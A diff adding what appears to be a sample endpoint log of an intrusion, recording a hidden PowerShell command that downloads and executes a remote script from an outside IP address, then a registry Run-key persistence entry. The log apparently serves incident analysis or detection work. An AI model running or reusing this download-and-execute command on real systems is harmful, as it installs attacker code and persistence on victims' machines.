@@ -1,0 +1,12 @@
+Timestamp: 2026-03-15 09:13:10
+User: employee
+Process: powershell.exe
+Command:
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://45.77.12.90/payload.ps1')"
+
+---
+
+Timestamp: 2026-03-15 09:13:45
+Process: reg.exe
+Action: Added persistence
+Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
